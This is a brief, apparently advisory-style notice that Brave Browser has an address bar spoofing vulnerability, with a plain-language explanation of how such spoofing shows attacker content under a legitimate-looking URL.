Brave Browser Suffers from Address Bar Spoofing Vulnerability. Address Bar
spoofing is a critical vulnerability in which any attacker can spoof the
address bar to a legit looking website but the content of the web-page
remains different from the Address-Bar display of the site. In Simple
words, the victim sees a familiar looking URL but the content is not from
the same URL but the attacker controlled content. Some companies say "We
recognize that the address bar is the only reliable security indicator in
modern browsers" .
